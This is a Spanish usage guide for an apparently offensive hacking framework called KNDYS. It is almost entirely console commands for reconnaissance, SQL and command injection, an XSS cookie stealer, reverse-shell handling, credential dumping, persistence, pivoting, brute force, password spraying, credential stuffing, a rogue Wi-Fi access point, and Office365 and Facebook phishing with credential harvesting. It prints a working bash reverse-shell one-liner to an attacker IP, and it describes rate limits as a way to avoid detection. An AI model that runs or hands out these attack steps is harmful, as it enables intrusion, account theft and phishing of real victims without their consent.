# Guía de Uso - KNDYS Framework

## Verificación de Módulos

Todos los 35 módulos han sido probados y funcionan correctamente:

```bash
# Ejecutar script de verificación automática
./test_modules.sh
```

## Ejemplos de Uso por Categoría

### 🔍 Reconnaissance (recon/)

#### Port Scanner
```bash
kndys> use recon/port_scanner
kndys(recon/port_scanner)> set target 192.168.1.1
kndys(recon/port_scanner)> set ports 1-1000
kndys(recon/port_scanner)> set threads 100
kndys(recon/port_scanner)> run
```

#### Subdomain Scanner
```bash
kndys> use recon/subdomain_scanner
kndys(recon/subdomain_scanner)> set domain example.com
kndys(recon/subdomain_scanner)> run
```

#### Web Crawler
```bash
kndys> use recon/web_crawler
kndys(recon/web_crawler)> set url https://example.com
kndys(recon/web_crawler)> set depth 3
kndys(recon/web_crawler)> run
```

#### Network Mapper
```bash
kndys> use recon/network_mapper
kndys(recon/network_mapper)> set network 192.168.1.0/24
kndys(recon/network_mapper)> run
```

### 🔎 Vulnerability Scanning (scan/)

#### Vulnerability Scanner
```bash
kndys> use scan/vuln_scanner
kndys(scan/vuln_scanner)> set target http://example.com
kndys(scan/vuln_scanner)> set scan_type full
kndys(scan/vuln_scanner)> run
```

#### SQL Scanner
```bash
kndys> use scan/sql_scanner
kndys(scan/sql_scanner)> set url http://example.com/page.php?id=1
kndys(scan/sql_scanner)> set technique time_based,error_based,boolean
kndys(scan/sql_scanner)> run
```

#### XSS Scanner
```bash
kndys> use scan/xss_scanner
kndys(scan/xss_scanner)> set url http://example.com/search
kndys(scan/xss_scanner)> run
```

#### CSRF Scanner
```bash
kndys> use scan/csrf_scanner
kndys(scan/csrf_scanner)> set url http://example.com
kndys(scan/csrf_scanner)> run
```

### ⚡ Exploitation (exploit/)

#### Multi Handler (para reverse shells)
```bash
kndys> use exploit/multi_handler
kndys(exploit/multi_handler)> set lhost 10.0.0.1
kndys(exploit/multi_handler)> set lport 4444
kndys(exploit/multi_handler)> run
```

#### SQL Injection
```bash
kndys> use exploit/sql_injection
kndys(exploit/sql_injection)> set url http://example.com/vuln.php?id=1
kndys(exploit/sql_injection)> set technique union
kndys(exploit/sql_injection)> run
```

#### XSS Exploit
```bash
kndys> use exploit/xss_exploit
kndys(exploit/xss_exploit)> set url http://example.com/search
kndys(exploit/xss_exploit)> set payload xss_cookie_stealer
kndys(exploit/xss_exploit)> run
```

#### Command Injection
```bash
kndys> use exploit/command_injection
kndys(exploit/command_injection)> set url http://example.com/cmd.php
kndys(exploit/command_injection)> set parameter cmd
kndys(exploit/command_injection)> set os linux
kndys(exploit/command_injection)> run
```

### 🎯 Post-Exploitation (post/)

#### Shell Interactiva
```bash
kndys> use post/shell
kndys(post/shell)> set session 1
kndys(post/shell)> run
# Luego puedes ejecutar comandos directamente
shell@session1> whoami
shell@session1> ls -la
shell@session1> exit
```

#### File Explorer
```bash
kndys> use post/file_explorer
kndys(post/file_explorer)> set session 1
kndys(post/file_explorer)> set path /home
kndys(post/file_explorer)> run
```

#### Privilege Escalation
```bash
kndys> use post/privilege_escalation
kndys(post/privilege_escalation)> set session 1
kndys(post/privilege_escalation)> set check all
kndys(post/privilege_escalation)> run
```

#### Credential Dumper
```bash
kndys> use post/credential_dumper
kndys(post/credential_dumper)> set session 1
kndys(post/credential_dumper)> set os linux
kndys(post/credential_dumper)> run
```

#### Persistence
```bash
kndys> use post/persistence
kndys(post/persistence)> set session 1
kndys(post/persistence)> set method cron
kndys(post/persistence)> run
```

#### Pivot
```bash
kndys> use post/pivot
kndys(post/pivot)> set session 1
kndys(post/pivot)> set target 192.168.2.0/24
kndys(post/pivot)> run
```

### 🔐 Password Attacks (password/)

#### Brute Force
```bash
kndys> use password/brute_force
kndys(password/brute_force)> set target ssh://192.168.1.1:22
kndys(password/brute_force)> set username admin
kndys(password/brute_force)> set service ssh
kndys(password/brute_force)> run
```

#### Hash Cracker
```bash
kndys> use password/hash_cracker
kndys(password/hash_cracker)> set hash 5f4dcc3b5aa765d61d8327deb882cf99
kndys(password/hash_cracker)> set type md5
kndys(password/hash_cracker)> set wordlist rockyou.txt
kndys(password/hash_cracker)> run
```

#### Password Spray
```bash
kndys> use password/spray_attack
kndys(password/spray_attack)> set target owa.example.com
kndys(password/spray_attack)> set usernames users.txt
kndys(password/spray_attack)> set passwords passwords.txt
kndys(password/spray_attack)> set delay 10
kndys(password/spray_attack)> run
```

#### Credential Stuffing
```bash
kndys> use password/credential_stuffing
kndys(password/credential_stuffing)> set target http://example.com/login
kndys(password/credential_stuffing)> set credentials ssh-defaults
kndys(password/credential_stuffing)> set threads 5
kndys(password/credential_stuffing)> run
```

### 📡 Wireless (wireless/)

#### WiFi Scanner
```bash
kndys> use wireless/wifi_scanner
kndys(wireless/wifi_scanner)> set interface wlan0
kndys(wireless/wifi_scanner)> set channel all
kndys(wireless/wifi_scanner)> run
```

#### WiFi Cracker
```bash
kndys> use wireless/wifi_cracker
kndys(wireless/wifi_cracker)> set handshake capture.pcap
kndys(wireless/wifi_cracker)> set wordlist rockyou.txt
kndys(wireless/wifi_cracker)> set bssid 00:11:22:33:44:55
kndys(wireless/wifi_cracker)> run
```

#### Rogue AP
```bash
kndys> use wireless/rogue_ap
kndys(wireless/rogue_ap)> set interface wlan0
kndys(wireless/rogue_ap)> set ssid Free_WiFi
kndys(wireless/rogue_ap)> set channel 6
kndys(wireless/rogue_ap)> run
```

### 🎭 Social Engineering (social/)

#### Phishing Campaign
```bash
kndys> use social/phishing
kndys(social/phishing)> set template office365
kndys(social/phishing)> set targets emails.txt
kndys(social/phishing)> set server smtp.gmail.com
kndys(social/phishing)> run
```

#### Credential Harvester
```bash
kndys> use social/credential_harvester
kndys(social/credential_harvester)> set port 80
kndys(social/credential_harvester)> set template facebook
kndys(social/credential_harvester)> set redirect https://facebook.com
kndys(social/credential_harvester)> run
```

#### Website Cloner
```bash
kndys> use social/website_cloner
kndys(social/website_cloner)> set url https://facebook.com
kndys(social/website_cloner)> set output phish_site
kndys(social/website_cloner)> run
```

### 📊 Reporting (report/)

#### Report Generator
```bash
kndys> use report/report_generator
kndys(report/report_generator)> set format html
kndys(report/report_generator)> set template default
kndys(report/report_generator)> set output pentest_report
kndys(report/report_generator)> run
```

#### Evidence Collector
```bash
kndys> use report/evidence_collector
kndys(report/evidence_collector)> set session 1
kndys(report/evidence_collector)> set output evidence.zip
kndys(report/evidence_collector)> run
```

## Generación de Payloads

```bash
kndys> generate payload
Payload type (reverse_shell/bind_shell/web_shell): reverse_shell
Platform (bash/python/php/powershell): bash
LHOST [10.0.3.25]: 
LPORT [4444]: 

[+] Generated payload:
bash -i >& /dev/tcp/10.0.3.25/4444 0>&1

Save to file? (y/n): y
Filename [payload.txt]: reverse.sh
[+] Payload saved to: reverse.sh
```

## Comandos Globales

### Ver todos los módulos
```bash
kndys> show modules
```

### Ver módulos por categoría
```bash
kndys> show modules recon
kndys> show modules scan
kndys> show modules exploit
```

### Ver payloads disponibles
```bash
kndys> show payloads
```

### Buscar exploits
```bash
kndys> search exploits sql
kndys> search exploits ssh
```

### Gestionar wordlists
```bash
kndys> show wordlists
kndys> download wordlist rockyou
kndys> download wordlist xato
kndys> download wordlist ssh-defaults
```

> El catálogo incluye listas de contraseñas, usuarios y combinaciones usuario:contraseña (default creds). Descarga las que necesites antes de lanzar ataques de fuerza bruta, spray o stuffing.

### Configuración global
```bash
kndys> setg lhost 10.0.0.1
kndys> setg lport 4444
kndys> setg threads 100
```

### Limpiar pantalla
```bash
kndys> clear
```

### Ayuda
```bash
kndys> help
```

## Notas Importantes

1. **Privilegios**: Algunos módulos (wireless, scapy) requieren root
2. **Rate Limiting**: Los módulos de password tienen límites para evitar detección

## Archivos Generados

El framework genera varios tipos de archivos:

- `kndys_session_*.log` - Logs de sesión
- `kndys_session_*.json` - Datos de sesión
- `vuln_scan_*.txt` - Reportes de vulnerabilidades
- `subdomains_*.txt` - Resultados de subdominios
- `crawl_results_*.json` - Resultados de crawling
- `privesc_check_*.txt` - Resultados de privesc
- `credentials_*.txt` - Credenciales extraídas
- `pentest_report.*` - Reportes finales
- `evidence.zip` - Archivo de evidencia

## Troubleshooting

### Módulo no responde
```bash
# Presiona Ctrl+C para interrumpir
# Luego usa 'back' para volver
kndys(modulo)> ^C
[!] Command interrupted
kndys(modulo)> back
```

### Error de permisos
```bash
chmod +x tt
# O para módulos que requieren root:
sudo python3 tt
```

### Dependencias faltantes
```bash
pip install -r requirements.txt
```

## Soporte

Para reportar bugs o sugerir mejoras, documenta:
1. Módulo usado
2. Comando ejecutado
3. Error obtenido
4. Sistema operativo

---

**KNDYS Framework v3.0** - "Dont forget to take your pills"
